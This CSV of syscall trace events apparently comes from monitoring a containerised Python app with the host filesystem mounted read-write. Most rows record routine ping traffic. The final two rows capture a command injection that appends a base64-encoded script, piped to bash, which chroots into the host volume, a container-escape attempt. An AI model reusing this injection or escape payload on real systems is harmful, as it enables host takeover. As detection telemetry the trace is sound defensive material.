evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
13:19:01.810563568,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:01.810600817,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:02.311225955,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:02.311282849,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:02.314486458,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:19:02.314492699,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>0.0.0.0:1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:19:02.314514068,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..]B......lc....|....................... !#$%&'()*+
13:19:02.314515110,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:19:02.314516924,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T`z..@..-..........eB......lc....|....................... !#$%&'()*+
13:19:02.314524898,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[30765]) size=57
13:19:02.314543285,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.019 ms.
13:19:02.314545229,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:19:02.314579509,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.019 ms.
13:19:02.314585470,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[30765]) size=8029
13:19:02.812234413,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:02.812270610,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:03.312916897,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:03.312953935,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:03.314517028,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:19:03.314528529,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:19:03.314590483,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..9A......lc............................ !#$%&'()*+
13:19:03.314593218,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:19:03.314598558,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T`...@.............AA......lc............................ !#$%&'()*+
13:19:03.314613495,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[30765]) size=57
13:19:03.314660984,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.054 ms.
13:19:03.314666684,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:19:03.314752627,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.054 ms.
13:19:03.314760301,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[30765]) size=7972
13:19:03.813615301,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:03.813660494,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:04.315049058,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
13:19:04.315134981,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
13:19:04.323160077,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:19:04.323176313,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:19:04.323274764,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..p.......lc....g....................... !#$%&'()*+
13:19:04.323288565,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:19:04.323299620,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:19:04.323300352,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:19:04.323310075,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T`...@.............x.......lc....g....................... !#$%&'()*+
13:19:04.323328293,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[30765]) size=57
13:19:04.323368800,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.086 ms.
13:19:04.323380169,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[30765]) size=1
13:19:04.323381542,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=1 data=.
13:19:04.323396736,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=58 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.086 ms..
13:19:04.323396736,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[30765]) size=147
13:19:04.323406999,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
13:19:04.323408432,exit_group,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:19:04.323419438,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[30765]) size=7914
13:19:04.323431294,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
13:19:04.323433318,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[30765]) size=7767
13:19:04.502690731,wait4,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
13:19:04.502759000,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
